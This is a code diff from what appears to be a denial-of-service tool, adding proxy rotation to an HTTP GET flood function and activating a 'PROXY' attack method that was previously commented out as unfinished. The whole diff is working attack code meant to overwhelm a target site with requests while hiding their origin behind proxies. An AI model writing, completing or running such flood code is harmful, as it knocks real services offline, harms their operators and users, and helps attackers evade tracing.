@@ -28,24 +28,25 @@ from src.utils import *
 from src.useragent import *
 
 def flood(attack_id, url, stoptime) -> None:
-    if not Core.proxy_file: return # no proxy file specified? just stop the function
+    if not Core.proxy_pool: return # proxy pool empty? just stop the function
 
     while time.time() < stoptime and Core.attackrunning:
         try:
 
+            proxy = utils().get_proxy()
             Core.session.get(
                 utils().buildblock(url), 
                 headers=utils().buildheaders(url),
                 verify=False, 
-                timeout=(5,0.1), 
+                timeout=(5,1), 
                 allow_redirects=False,
                 stream=False,
                 cert=None,
-                proxies={'http': ''}
+                proxies=proxy
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
-        except requests.exceptions.ReadTimeout: # if we get a ReadTimeout error, we count it as sent
+        except requests.exceptions.ReadTimeout:
             Core.infodict[attack_id]['req_sent'] += 1
 
         except Exception:
@@ -54,10 +55,9 @@ def flood(attack_id, url, stoptime) -> None:
         Core.infodict[attack_id]['req_total'] += 1
     Core.threadcount -= 1
 
-# commented out because not finished yed
-#Core.methods.update({
-#    'PROXY': {
-#        'info': 'HTTP GET flood, using a specified file with proxies',
-#        'func': flood
-#    }
-#})
+Core.methods.update({
+    'PROXY': {
+        'info': 'HTTP GET flood, using a specified file with proxies',
+        'func': flood
+    }
+})
